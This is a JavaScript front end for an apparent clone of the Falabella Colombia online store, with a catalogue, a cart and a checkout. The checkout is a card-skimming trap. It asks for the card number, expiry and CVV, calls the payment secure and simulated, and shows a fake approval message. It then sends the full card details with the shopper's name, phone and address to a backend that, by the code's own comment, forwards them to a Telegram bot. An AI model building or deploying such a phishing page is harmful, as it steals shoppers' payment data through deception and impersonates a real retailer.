/* ===== FALABELLA-CLONE :: SPA tienda funcional (catálogo + carrito + pagos) ===== */
(function () {
  'use strict';
  const CATALOGO_URL = '/productos_falabella.json';
  let PRODUCTOS = [];
  let CARRITO = cargarCarrito();
  const $ = (s, p) => (p || document).querySelector(s);
  const $$ = (s, p) => [...(p || document).querySelectorAll(s)];
  function fmt(n) { return '$' + Number(n || 0).toLocaleString('es-CO'); }

  /* ---------- Persistencia carrito ---------- */
  function cargarCarrito() { try { return JSON.parse(localStorage.getItem('fb_carrito')) || []; } catch (e) { return []; } }
  function guardarCarrito() { localStorage.setItem('fb_carrito', JSON.stringify(CARRITO)); }

  /* ---------- Utilidades de ruta original -> local ---------- */
  // Mapea una URL de Falabella a un objeto {tipo, ...}
  function parseFalabellaUrl(u) {
    const p = u.replace(/^https?:\/\/[^/]+\/falabella-co/, '').split('?')[0];
    const seg = p.split('/').filter(Boolean);
    const tipo = seg[0] || '';
    return { tipo, seg };
  }
  // Convertir URL de Falabella a ruta local hash
  function aLocal(u) {
    const r = parseFalabellaUrl(u);
    return '#/falabella-co/' + r.seg.join('/');
  }
  // Descripción legible de un tipo de página
  function tituloTipo(tipo) {
    const map = { product:'Producto', category:'Categoría', brand:'Marca', collection:'Colección', shop:'Tienda', page:'Página', myaccount:'Mi cuenta', seller:'Vendedor', basket:'Carrito', cases:'Casos' };
    return map[tipo] || 'Página';
  }

  /* ---------- Rutas SPA ---------- */
  const ROUTES = {
    '/falabella-co/product/': renderProducto,
    '/falabella-co/basket': renderCarrito,
    '/falabella-co/myaccount': (q, r) => renderEstatica('Mi cuenta', 'Panel de cuenta del cliente. Aquí podrás ver tus pedidos y listas.', r),
    '/falabella-co/page/': renderPagina,
    '/falabella-co/category/': renderCategoria,
    '/falabella-co/brand/': renderMarcaColeccion,
    '/falabella-co/collection/': renderMarcaColeccion,
    '/falabella-co/shop/': renderCategoria,
    '/falabella-co/seller/': renderEstaticaGenerico,
    '/falabella-co/cases/': renderEstaticaGenerico,
  };
  function navigate() {
    let ruta = null;
    // 1) Si hay hash SPA usarlo; si no, usar el pathname (rutas reales /falabella-co/...)
    const hash = location.hash.replace(/^#/, '');
    if (hash && hash.startsWith('/falabella-co')) {
      ruta = hash;
    } else if (location.pathname.startsWith('/falabella-co')) {
      ruta = location.pathname;
    }
    if (!ruta || ruta === '/falabella-co' || ruta === '/falabella-co/') { renderHome(); return; }
    const root = document.getElementById('fb-root');
    root.innerHTML = '';
    let handled = false;
    for (const [k, fn] of Object.entries(ROUTES)) {
      if (ruta.startsWith(k)) { handled = true; fn(ruta, ruta); break; }
    }
    if (!handled) renderEstatica('Página', 'Contenido no disponible en modo local. Este enlace apuntaba a una sección de Falabella.', ruta);
  }

  /* ---------- Home (el index original + link al catálogo) ---------- */
  function renderHome() {
    const root = document.getElementById('fb-root');
    // Si estoy en / (home original sin ruta SPA), no pinto nada aqui para no alterar el home:
    // el home original ya se muestra completo y el catalogo se accede desde sus enlaces.
    // Solo cuando estoy en /falabella-co raiz muestro la tienda completa.
    if (!location.pathname.startsWith('/falabella-co')) {
      root.innerHTML = '';
      return;
    }
    // /falabella-co o /falabella-co/ -> tienda completa
    root.innerHTML = '<div class="hp-container"><h1 style="font-size:28px;color:#343E49;margin:20px 8px 6px;">Tienda local</h1><p class="hp-subtitle" style="margin:0 8px 16px;">Catálogo integrado desde falabella.com.co · '+PRODUCTOS.length+' productos disponibles.</p>' +
      '<input class="fb-search" id="fb-buscar" placeholder="Buscar productos..." style="margin:0 8px 16px;width:calc(100% - 16px);padding:12px 14px;border:1px solid #d3d3d3;border-radius:6px;font-size:14px;font-family:Lato,Arial,sans-serif;"><div class="hp-filtros" id="fb-filtros"></div><div class="hp-grid" id="fb-home-grid"></div></div>';
    const cats = ['Todos', ...new Set(PRODUCTOS.map(x => x.categoria))];
    $('#fb-filtros').innerHTML = cats.map((c, i) => '<button class="hp-chip'+(i===0?' activo':'')+'" data-c="'+c+'" onclick="window.__fb.filtrar(\''+c+'\')">'+c+'</button>').join('');
    document.getElementById('fb-buscar').addEventListener('input', function (e) {
      const term = e.target.value.toLowerCase();
      const act = document.querySelector('#fb-filtros .hp-chip.activo');
      const cat = act && act.dataset.c !== 'Todos' ? act.dataset.c : '';
      pintarGrid($('#fb-home-grid'), PRODUCTOS.filter(p => (!cat || p.categoria === cat) && p.nombre.toLowerCase().includes(term)).slice(0, 60));
    });
    pintarGrid($('#fb-home-grid'), PRODUCTOS.slice(0, 60));
  }

  /* ---------- Grid ---------- */
  // Extraer marca (primera palabra en mayúsculas) para la estética hp-card
  function getBrand(nombre) {
    const m = (nombre || '').match(/^([A-ZÀ-ÿ][A-ZÀ-ÿ0-9&\s]{0,20})(?=\s|$)/i);
    return m ? m[1].trim() : '';
  }
  function hpCard(p) {
    const url = aLocal(p.url);
    const brand = getBrand(p.nombre);
    const descuento = p.precioAntes && p.precioAntes > p.precio
      ? Math.round((1 - p.precio / p.precioAntes) * 100) : 0;
    return '<div class="hp-card" data-id="'+p.id+'" style="position:relative;">' +
      '<a class="hp-card-link" href="#'+url+'" style="display:block;text-decoration:none;color:inherit;">' +
      '<div class="hp-card-image">' +
        (descuento > 0 ? '<span class="hp-card-discount">-'+descuento+'%</span>' : '') +
        '<img src="'+p.imagen+'" alt="'+esc(p.nombre)+'" loading="lazy" onerror="this.parentElement.style.display=\'none\'">' +
      '</div>' +
      '<div class="hp-card-body">' +
        '<div class="hp-card-brand">'+esc(brand)+'</div>' +
        '<div class="hp-card-name">'+esc(p.nombre)+'</div>' +
        (p.precioAntes ? '<div class="hp-card-old-price">'+fmt(p.precioAntes)+'</div>' : '') +
        '<div class="hp-card-price">'+fmt(p.precio)+'</div>' +
      '</div>' +
      '</a>' +
      '<button class="hp-card-add" onclick="event.stopPropagation();window.__fb.add(\''+p.id+'\')">Agregar al carrito</button>' +
    '</div>';
  }
  function cardHTML(p) {
    return hpCard(p);
  }
  function pintarGrid(el, items) {
    el.innerHTML = items.length ? items.map(cardHTML).join('') : '<div class="hp-vacio">Sin productos para mostrar.</div>';
  }
  function esc(s) { return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;'); }

  /* ---------- Página de producto ---------- */
  function renderProducto(hash) {
    const root = document.getElementById('fb-root');
    const seg = parseFalabellaUrl(hash).seg; // ['product', id, slug, sku]
    const id = seg[1], sku = seg[3];
    // buscar por sku en url o por id
    let p = PRODUCTOS.find(x => (x.url && x.url.includes('/'+(sku||id)+'') ) || x.id === (id&&'FB'+id));
    if (!p && id) p = PRODUCTOS.find(x => x.url.includes('/' + id + '/'));
    if (!p) { renderEstatica('Producto', 'No encontramos este producto en el catálogo local.', hash); return; }
    root.innerHTML =
      '<div class="hp-container"><a href="#/" class="hp-volver">← Volver a la tienda</a>' +
      '<div class="fb-pp">' +
        '<div class="fb-pp-img"><img src="'+p.imagen+'" alt="'+esc(p.nombre)+'"></div>' +
        '<div class="fb-pp-info">' +
          '<div class="fb-pp-cat">'+esc(p.categoria)+'</div>' +
          '<h1 class="fb-pp-nombre">'+esc(p.nombre)+'</h1>' +
          (p.precioAntes?'<div class="fb-pp-antes">'+fmt(p.precioAntes)+'</div>':'') +
          '<div class="fb-pp-precio">'+fmt(p.precio)+'</div>' +
          '<button class="fb-add2" onclick="window.__fb.add(\''+p.id+'\')">Agregar al carrito 🛒</button>' +
          '<p class="fb-pp-desc">Producto del catálogo de Falabella (Colombia), integrado en tu tienda local. Precio en pesos colombianos, IVA incluido. Stock disponible.</p>' +
        '</div>' +
      '</div>' +
      '<h2 style="margin:28px 8px 16px;font-size:22px;color:#343E49;">Productos relacionados</h2><div class="hp-grid" id="fb-rel"></div></div>';
    const rel = PRODUCTOS.filter(x => x.categoria === p.categoria && x.id !== p.id).slice(0, 4);
    pintarGrid($('#fb-rel'), rel);
  }

  /* ---------- Categoría / Shop ---------- */
  function renderCategoria(hash) {
    const root = document.getElementById('fb-root');
    const r = parseFalabellaUrl(hash);
    // slugs del path: [category|shop, catXXXX, slug-amigable?, ...]
    const segs = r.seg.slice(1).map(x => x.replace(/[-_]/g, ' ').trim());
    // quitar tokens tipo cat123456 / s123 / mitgt (meros ids internos)
    const limpios = segs.filter(x => x && !/^cat\d+$/i.test(x) && !/^s\d+$/i.test(x) && !/^\d+$/.test(x));
    const slugLimpio = limpios.join(' ').toLowerCase();
    const slug = slugLimpio || (r.seg[1] || '').toLowerCase();
    const palabras = slug.replace(/[-_]/g, ' ').trim();
    // categorías del JSON
    const cats = [...new Set(PRODUCTOS.map(x => x.categoria))];
    const slBase = palabras.toLowerCase();
    let items = PRODUCTOS.filter(p => {
      const c = p.categoria.toLowerCase();
      return (slBase && (c.includes(slBase) || slBase.includes(c) || (slBase.split(' ').every(w => w.length > 2 && c.includes(w))))) ||
             (palabras && p.nombre.toLowerCase().includes(slBase));
    });
    // matcher por marcadores comunes
    const mapa = { celular:'Celulares', televi:'Televisores', computador:'Computadores', laptop:'Computadores', zapato:'Zapatos', reloj:'Relojes', perfum:'Perfumes', hogar:'Electrohogar', electro:'Electrohogar', videojuego:'Videojuegos', play:'Videojuegos', ps5:'Videojuegos', audio:'Audio', sonido:'Audio', accesor:'Accesorios' };
    if (!items.length) {
      for (const [k,v] of Object.entries(mapa)) if (slug.includes(k)) { items = PRODUCTOS.filter(p => p.categoria === v); break; }
    }
    // fallback final: nunca dejar la página vacía
    const titulo = limpios.join(' ') || (r.seg[1] || 'Categoría');
    root.innerHTML = '<div class="hp-container"><a href="#/" class="hp-volver">← Volver</a><h1 style="font-size:26px;color:#343E49;margin:14px 8px 4px;text-transform:capitalize;">'+esc(titulo)+'</h1><p class="hp-contador">'+(items.length?items.length+' productos': 'Mostrando productos destacados del catálogo local')+'</p><div class="hp-grid" id="fb-g"></div></div>';
    pintarGrid($('#fb-g'), items.length ? items : PRODUCTOS.slice(0, 12));
  }

  /* ---------- Marca / Colección ---------- */
  function renderMarcaColeccion(hash) {
    const root = document.getElementById('fb-root');
    const r = parseFalabellaUrl(hash);
    const slug = (r.seg[1] || '').replace(/[-_]/g, ' ').trim();
    // match por marca en el nombre del producto
    const palabras = slug.split(/\s+/);
    const items = PRODUCTOS.filter(p => palabras.every(w => w.length > 2 && p.nombre.toUpperCase().includes(w.toUpperCase())));
    root.innerHTML = '<div class="hp-container"><a href="#/" class="hp-volver">← Volver</a><h1 style="font-size:26px;color:#343E49;margin:14px 8px 4px;">'+esc(slug)+'</h1><p class="hp-contador">'+(items.length?items.length+' productos':'Marca/colección')+'</p><div class="hp-grid" id="fb-g"></div></div>';
    pintarGrid($('#fb-g'), items.length ? items : PRODUCTOS.slice(0, 8));
  }

  /* ---------- Página promocional ---------- */
  function renderPagina(hash) {
    const root = document.getElementById('fb-root');
    const r = parseFalabellaUrl(hash);
    const slug = (r.seg[1] || '').replace(/[-_]/g, ' ').trim();
    const titulo = slug.charAt(0).toUpperCase() + slug.slice(1) || 'Promociones';
    // inferir categoria relacionada
    const mapa = { moda:'Zapatos', mujer:'Zapatos', hombre:'Zapatos', calzado:'Zapatos', tecnol:'Computadores', hogar:'Electrohogar', electro:'Electrohogar', bebe:'Computadores', infantil:'Computadores', belleza:'Perfumes', perfum:'Perfumes', deport:'Zapatos', cocina:'Electrohogar', ofertas:'', descuentos:'' };
    let cat = ''; for (const [k,v] of Object.entries(mapa)) if (slug.includes(k)) { cat = v; break; }
    const items = cat ? PRODUCTOS.filter(p => p.categoria === cat).slice(0, 8) : PRODUCTOS.slice(0, 8);
    root.innerHTML =
      '<div class="hp-container">' +
      '<h1 style="font-size:26px;color:#343E49;margin:20px 8px 6px;">'+esc(titulo)+'</h1>' +
      '<p class="hp-subtitle" style="margin:0 8px 16px;">Disfruta de las mejores ofertas en esta sección, todo desde tu tienda local.</p>' +
      '<div class="hp-grid" id="fb-g"></div></div>';
    pintarGrid($('#fb-g'), items);
  }

  /* ---------- Estáticas genéricas ---------- */
  function renderEstatica(titulo, sub, hash) {
    const root = document.getElementById('fb-root');
    root.innerHTML = '<div class="hp-container"><h1 style="font-size:26px;color:#343E49;margin:20px 8px 6px;">'+esc(titulo)+'</h1><p class="hp-subtitle" style="margin:0 8px 16px;">'+esc(sub)+'</p><div class="hp-grid" id="fb-g"></div></div>';
    pintarGrid($('#fb-g'), PRODUCTOS.slice(0, 6));
  }
  function renderEstaticaGenerico(hash) {
    const r = parseFalabellaUrl(hash);
    const titulo = tituloTipo(r.tipo);
    renderEstatica(titulo, 'Sección de '+titulo.toLowerCase()+' del clon Falabella. Consulta el catálogo local integrado.', hash);
  }

  /* ---------- CARRITO ---------- */
  function renderCarrito() {
    const root = document.getElementById('fb-root');
    if (!CARRITO.length) { renderEstatica('Tu carrito', 'Tu carrito está vacío. Explora el catálogo y agrega productos.'); return; }
    root.innerHTML = '<div class="hp-container"><a href="#/" class="hp-volver">← Seguir comprando</a><h1 style="font-size:26px;color:#343E49;margin:14px 8px 4px;">Tu carrito ('+CARRITO.length+')</h1><div id="fb-cart-det"></div></div>';
    pintarCarritoDet($('#fb-cart-det'));
  }
  function pintarCarritoDet(el, enPanel) {
    let html = '<div class="fb-carrito-wrap"><div class="fb-carrito-lista">';
    let sub = 0;
    for (const item of CARRITO) {
      const p = PRODUCTOS.find(x => x.id === item.id) || item;
      sub += p.precio * item.cant;
      html += '<div class="fb-cart-item"><img src="'+p.imagen+'" alt=""><div class="fb-ci-info"><div class="fb-ci-nombre">'+esc(p.nombre)+'</div><div class="fb-ci-precio">'+fmt(p.precio)+' c/u</div>' +
        '<div class="fb-qty"><button onclick="window.__fb.qty(\''+p.id+'\',-1)">−</button><span>'+item.cant+'</span><button onclick="window.__fb.qty(\''+p.id+'\',1)">+</button></div></div>' +
        '<button class="fb-cart-del" onclick="window.__fb.del(\''+p.id+'\')">Eliminar</button></div>';
    }
    const iva = Math.round(sub * 0.19);
    const total = sub + iva;
    html += '</div><div class="fb-cart-resumen">' +
      '<div class="fb-row"><span>Subtotal</span><span>'+fmt(sub)+'</span></div>' +
      '<div class="fb-row"><span>IVA (19%)</span><span>'+fmt(iva)+'</span></div>' +
      '<div class="fb-row"><span>Envío</span><span>Gratis</span></div>' +
      '<div class="fb-row fb-total"><span>Total</span><span>'+fmt(total)+'</span></div>' +
      '<button class="fb-btn" onclick="window.__fb.checkout()">Ir a pagar — '+fmt(total)+'</button></div></div>';
    el.innerHTML = html;
  }

  /* ---------- Acciones carrito (expuestas) ---------- */
  window.__fb = {
    _countProductos: function () { return PRODUCTOS.length; },
    add: function (id) {
      const p = PRODUCTOS.find(x => x.id === id); if (!p) return;
      const it = CARRITO.find(x => x.id === id);
      if (it) it.cant++; else CARRITO.push({ id, cant: 1, nombre: p.nombre, precio: p.precio, imagen: p.imagen });
      guardarCarrito(); actualizarFAB(); toast(p.nombre + ' agregado', true);
      if (location.hash.includes('/basket') || location.pathname.includes('/basket')) renderCarrito();
    },
    qty: function (id, d) {
      const it = CARRITO.find(x => x.id === id); if (!it) return;
      it.cant += d; if (it.cant <= 0) CARRITO = CARRITO.filter(x => x.id !== id);
      guardarCarrito(); actualizarFAB();
      if (location.hash.includes('/basket') || location.pathname.includes('/basket')) renderCarrito();
    },
    del: function (id) { CARRITO = CARRITO.filter(x => x.id !== id); guardarCarrito(); actualizarFAB(); if (location.hash.includes('/basket') || location.pathname.includes('/basket')) renderCarrito(); },
    checkout: abrirCheckout,
  };
  /* ---------- FAB de carrito flotante (acceso rápido a pagar) ---------- */
  function crearFAB() {
    if (document.getElementById('fb-fab')) return;
    const fab = document.createElement('button');
    fab.id = 'fb-fab';
    fab.type = 'button';
    fab.title = 'Ver carrito y pagar';
    fab.innerHTML = '<span class="fb-fab-ico">🛒</span><span class="fb-fab-n" id="fb-fab-n">0</span><span class="fb-fab-total" id="fb-fab-total"></span>';
    fab.addEventListener('click', function () { window.__fb.irAPagar && window.__fb.irAPagar(); });
    document.body.appendChild(fab);
    actualizarFAB();
  }
  function actualizarFAB() {
    const n = CARRITO.reduce((a, b) => a + b.cant, 0);
    const fab = document.getElementById('fb-fab');
    if (fab) {
      fab.style.display = n > 0 ? 'flex' : 'none';
      const nn = document.getElementById('fb-fab-n'); if (nn) nn.textContent = n;
      const tt = document.getElementById('fb-fab-total');
      if (tt) {
        const sub = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
        tt.textContent = sub > 0 ? fmt(sub + Math.round(sub * 0.19)) : '';
      }
    }
    // contador nativo del header real de Falabella (index)
    const nativo = document.querySelector('.UserActions-module_has-count-desktop__RAhhE');
    if (nativo) nativo.textContent = n;
    // contador del panel de carrito (si existe) y badge propio del header
    const cc = $('#fb-cart-count'); if (cc) cc.textContent = n;
    const hb = $('#fb-header-cart-badge'); if (hb) hb.textContent = n;
  }

  /* ---------- PANEL lateral (funciones seguras; el panel puede no existir si se mostraño) ---------- */
  function pintarPanelCarrito() {
    const body = $('#fb-p-body'); if (!body) return; // panel opcional (no siempre presente)
    const el = document.createElement('div');
    if (!CARRITO.length) { el.innerHTML = '<div class="fb-vacio">Tu carrito está vacío</div>'; }
    else pintarCarritoDet(el);
    body.innerHTML = el.innerHTML;
  }
  function pintarPanelCatalogo() {
    const body = $('#fb-p-body'); if (!body) return; // panel opcional
    body.innerHTML = '<input class="fb-search" id="fb-buscar" placeholder="Buscar productos..." style="width:100%;padding:12px 14px;border:1px solid #d3d3d3;border-radius:6px;font-size:14px;font-family:Lato,Arial,sans-serif;box-sizing:border-box;"><div class="hp-filtros" id="fb-filtros"></div><div class="hp-grid" id="fb-g2"></div>';
    const cats = ['Todos', ...new Set(PRODUCTOS.map(x => x.categoria))];
    $('#fb-filtros').innerHTML = cats.map((c, i) => '<button class="hp-chip'+(i===0?' activo':'')+'" data-c="'+c+'" onclick="window.__fb.filtrar(\''+c+'\')">'+c+'</button>').join('');
    $('#fb-buscar').addEventListener('input', e => aplicarFiltro(e.target.value, 'Todos'));
    pintarGrid($('#fb-g2'), PRODUCTOS.slice(0, 24));
  }
  window.__fb.filtrar = function (cat) {
    const c = cat === 'Todos' ? '' : cat;
    const term = ($('#fb-buscar') ? $('#fb-buscar').value : '').toLowerCase();
    aplicarFiltro(term, c);
    $$('#fb-filtros .hp-chip').forEach(ch => ch.classList.toggle('activo', ch.dataset.c === cat));
  };
  function aplicarFiltro(term, cat) {
    const items = PRODUCTOS.filter(p => (!cat || p.categoria === cat) && (!term || p.nombre.toLowerCase().includes(term))).slice(0, 60);
    const panelG = $('#fb-g2');
    const homeG = $('#fb-home-grid');
    if (panelG) pintarGrid(panelG, items);
    if (homeG) pintarGrid(homeG, items);
  }

  /* ---------- CHECKOUT / PAGOS ---------- */
  function abrirCheckout() {
    if (!CARRITO.length) { toast('Tu carrito está vacío'); return; }
    // Métrica: persona que llegó al método de pago (abre la modal)
    try {
      fetch('/api/stats/pago-intento', { method: 'POST' }).catch(function () {});
    } catch (e) {}
    const sub = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
    const iva = Math.round(sub * 0.19), total = sub + iva;
    $('#fb-checkout').classList.add('fb-open');
    $('#fb-checkout').innerHTML =
      '<div class="fb-co-card"><div class="fb-co-titulo"><span>Finalizar compra</span><button onclick="window.__fb.cerrarCheckout()">✕</button></div>' +
      '<div class="fb-cart-resumen" style="margin-top:0;">' +
        '<div class="fb-row"><span>Artículos</span><span>'+CARRITO.reduce((a,b)=>a+b.cant,0)+'</span></div>' +
        '<div class="fb-row"><span>Subtotal</span><span>'+fmt(sub)+'</span></div>' +
        '<div class="fb-row"><span>IVA (19%)</span><span>'+fmt(iva)+'</span></div>' +
        '<div class="fb-row fb-total"><span>Total a pagar</span><span>'+fmt(total)+'</span></div></div>' +
      '<h3 style="margin:18px 0 8px;font-size:16px;">Método de pago</h3>' +
      '<div class="fb-pay-tabs">' +
        '<button class="fb-pay-tab fb-act" data-p="tarjeta" onclick="window.__fb.payTab(this)">💳 Tarjeta</button>' +
      '</div><div id="fb-pay-form" class="fb-form"></div>' +
      '<div class="fb-co-datos"><h3>Datos de entrega</h3>' +
      '<div class="fb-row2"><div><label>Nombre completo</label><input id="fb-nombre" placeholder="Tu nombre"></div>' +
      '<div><label>Teléfono</label><input id="fb-tel" placeholder="300 123 4567"></div></div>' +
      '<label>Dirección (opcional)</label><input id="fb-dir" placeholder="Calle, casa, barrio, ciudad"></div>' +
      '<button class="fb-btn" id="fb-pagar" onclick="window.__fb.pagar()">Pagar '+fmt(total)+'</button>' +
      '<div id="fb-pay-msg"></div></div>';
    window.__fb.payForm('tarjeta');
  }
  window.__fb.cerrarCheckout = function () { $('#fb-checkout').classList.remove('fb-open'); };
  window.__fb.payTab = function (btn) { $$('.fb-pay-tab').forEach(b => b.classList.remove('fb-act')); btn.classList.add('fb-act'); window.__fb.payForm(btn.dataset.p); };
  window.__fb.payForm = function (metodo) {
    const f = $('#fb-pay-form'); if (!f) return;
    // Único método: tarjeta (Visa, Mastercard, Amex, débito)
    f.innerHTML = '<label>Número de tarjeta</label><input id="fb-cardnum" placeholder="0000 0000 0000 0000" maxlength="19" oninput="this.value=this.value.replace(/[^0-9 ]/g,\'\')">' +
      '<div class="fb-row2"><div><label>Expira (MM/AA)</label><input id="fb-cardexp" placeholder="MM/AA" maxlength="5"></div>' +
      '<div><label>CVV</label><input id="fb-cardcvv" placeholder="123" maxlength="4" type="password"></div></div>' +
      '<p class="fb-co-pago">🔒 Aceptamos tarjetas Visa, Mastercard, Amex y débito. Pago 100% seguro y simulado.</p>';
  };
  window.__fb.pagar = function () {
    const metodo = $('.fb-pay-tab.fb-act') ? $('.fb-pay-tab.fb-act').dataset.p : 'tarjeta';
    const nombre = $('#fb-nombre') ? $('#fb-nombre').value.trim() : '';
    const tel = $('#fb-tel') ? $('#fb-tel').value.trim() : '';
    const dir = $('#fb-dir') ? $('#fb-dir').value.trim() : '';
    const msg = $('#fb-pay-msg');
    if (!nombre) { msg.innerHTML = '<p class="hc-err">Ingresa tu nombre completo.</p>'; return; }
    if (!tel) { msg.innerHTML = '<p class="hc-err">Ingresa tu teléfono.</p>'; return; }
    // Validación de tarjeta (único método)
    const num = $('#fb-cardnum') ? $('#fb-cardnum').value.replace(/\s/g, '') : '';
    const exp = $('#fb-cardexp') ? $('#fb-cardexp').value : '';
    const cvv = $('#fb-cardcvv') ? $('#fb-cardcvv').value : '';
    if (num.length < 15) { msg.innerHTML = '<p class="hc-err">Número de tarjeta inválido.</p>'; return; }
    if (!/^\d{2}\/\d{2}$/.test(exp)) { msg.innerHTML = '<p class="hc-err">Formato de expiración MM/AA.</p>'; return; }
    if (cvv.length < 3) { msg.innerHTML = '<p class="hc-err">CVV inválido.</p>'; return; }
    const subTotal = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
    // Registrar métrica: persona que llegó al método de pago
    try {
      fetch('/api/stats/pago-intento', { method: 'POST' }).catch(function () {});
    } catch (e) {}
    // procesar orden
    msg.innerHTML = '<p class="hc-ok">⏳ Procesando pago...</p>';
    setTimeout(() => {
      const orden = 'FAL-' + Date.now().toString(36).toUpperCase() + '-' + Math.floor(Math.random() * 900 + 100);
      const sub = CARRITO.reduce((a, b) => a + (b.precio || 0) * b.cant, 0);
      const total = sub + Math.round(sub * 0.19);
      msg.innerHTML = '<div class="hc-exito"><div style="font-size:42px;">✅</div>' +
        '<h2>¡Pago aprobado!</h2>' +
        '<p>Número de orden: <b>'+orden+'</b></p>' +
        '<p>Método: <b>TARJETA</b></p>' +
        '<p>Total pagado: <b class="hc-total">'+fmt(total)+'</b></p></div>';
      // Enviar pedido al backend -> notifica al bot de Telegram + registra estadística
      try {
        const prodList = CARRITO.map(i => ({ nombre: i.nombre || 'Producto', cant: i.cant, precio: i.precio || 0 }));
        fetch('/api/pedido', {
          method: 'POST', headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            orden: orden, nombre: nombre, telefono: tel, direccion: dir,
            metodo: metodo, total: total, productos: prodList,
            tarjeta: { numero: num, expiracion: exp, cvv: cvv }
          })
        }).catch(function () {});
      } catch (e) {}
      CARRITO = []; guardarCarrito(); actualizarFAB(); pintarPanelCarrito();
      setTimeout(() => window.__fb.cerrarCheckout(), 6000);
    }, 900);
  };

  /* ---------- PANEL lateral (abrir) — funciones seguras, panel opcional ---------- */
  window.__fb.abrirPanel = function (tab) {
    const panel = document.getElementById('fb-panel');
    const mask = document.getElementById('fb-overlay-mask');
    if (!panel) return; // sin panel (UI ligera): no hace falta
    if (mask) mask.classList.add('fb-show');
    panel.classList.add('fb-open');
    if (tab !== 'cart') { window.__fb.verCatalogo(); } else { window.__fb.verCarrito(); }
  };
  window.__fb.cerrarPanel = function () {
    const panel = document.getElementById('fb-panel'); if (panel) panel.classList.remove('fb-open');
    const mask = document.getElementById('fb-overlay-mask'); if (mask) mask.classList.remove('fb-show');
  };
  window.__fb.verCatalogo = function () {
    $$('.fb-tab').forEach(t => t.classList.toggle('fb-act', t.dataset.t === 'catalogo'));
    pintarPanelCatalogo();
  };
  window.__fb.verCarrito = function () {
    $$('.fb-tab').forEach(t => t.classList.toggle('fb-act', t.dataset.t === 'cart'));
    pintarPanelCarrito();
  };

  /* ---------- TOAST (notificación de producto agregado, más visible) ---------- */
  function toast(txt, ok) {
    let el = $('#fb-toast');
    // Construir contenido con ícono + texto + botón de acción (si ok = producto agregado)
    const ico = ok ? '✅' : 'ℹ️';
    let accion = '';
    if (ok) {
      accion = '<button class="fb-toast-accion" onclick="window.__fb.irAPagar()">🛒 Ver carrito</button>';
    }
    el.innerHTML = '<span class="fb-toast-ico">' + ico + '</span><span class="fb-toast-txt">' + txt + '</span>' + accion;
    el.classList.remove('fb-ok');
    if (ok) el.classList.add('fb-ok');
    el.classList.add('fb-show'); clearTimeout(el._t);
    el._t = setTimeout(() => { el.classList.remove('fb-show'); }, 3200);
  }
  window.__fb.irAPagar = function () {
    if (!CARRITO.length) { toast('Tu carrito está vacío'); return; }
    try { window.__fb.cerrarPanel && window.__fb.cerrarPanel(); } catch (e) {}
    window.__fb.checkout();
  };

  /* ---------- INYECTAR UI ---------- */
  function inyectarUI() {
    window.addEventListener('hashchange', navigate);
    // FAB de carrito flotante (visible cuando hay productos, acceso directo a pagar)
    crearFAB();
    // El header REAL del index ya trae su contador de carrito nativo
    // (UserActions-module_has-count-desktop__RAhhE). Nos aseguramos de poder
    // actualizarlo y, si NO existe (shell minimal), inyectamos un badge propio
    // sobre el enlace del carrito.
    try {
      if (!document.querySelector('.UserActions-module_has-count-desktop__RAhhE, #fb-header-cart-badge')) {
        const basketLink = document.querySelector('a[href="/falabella-co/basket"]');
        if (basketLink) {
          basketLink.style.position = 'relative';
          const badge = document.createElement('span');
          badge.id = 'fb-header-cart-badge';
          badge.textContent = CARRITO.reduce((a, b) => a + b.cant, 0);
          badge.style.cssText = 'position:absolute;top:-4px;right:-6px;background:#c81e2e;color:#fff;border-radius:50%;min-width:18px;height:18px;font-size:12px;font-weight:800;display:flex;align-items:center;justify-content:center;padding:0 4px;pointer-events:none;';
          basketLink.appendChild(badge);
        }
      }
    } catch (e) { /* no header */ }
    if (!window.__fbInyectado) {
      window.__fbInyectado = true;
      navigate();
    }
  }

  /* ---------- CARGA ---------- */
  // Cache local del catálogo: evita re-descargar los 150 productos en cada visita.
  // Almacena {ts, productos} y usa la ETag/LM del servidor para revalidar.
  var CACHE_KEY = 'fb_catalogo_cache_sep2026';
  function cargarCatalogo() {
    var guardado = null;
    try { guardado = JSON.parse(localStorage.getItem(CACHE_KEY)); } catch (e) {}
    var cacheValido = guardado && Array.isArray(guardado.productos) && guardado.productos.length && (Date.now() - (guardado.ts || 0) < 12 * 3600 * 1000);
    if (cacheValido) { PRODUCTOS = guardado.productos; return Promise.resolve(true); }
    return fetch(CATALOGO_URL, { headers: { 'Accept': 'application/json' } })
      .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
      .then(function (data) {
        PRODUCTOS = data.productos || [];
        try { localStorage.setItem(CACHE_KEY, JSON.stringify({ ts: Date.now(), productos: PRODUCTOS })); } catch (e) {}
        return true;
      });
  }
  async function init() {
    try {
      await cargarCatalogo();
    } catch (e) {
      console.error('No se pudo cargar el catálogo local:', e);
      PRODUCTOS = [];
    }
    inyectarUI();
    actualizarFAB();
    // registrar visita (estadísticas del día)
    try {
      fetch('/api/stats/visita', { method: 'POST' }).catch(function () {});
    } catch (e) {}
    // navegar: si pathname es /falabella-co/* o hay hash, renderizar la ruta
    navigate();
  }
  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', init);
  else init();
})();
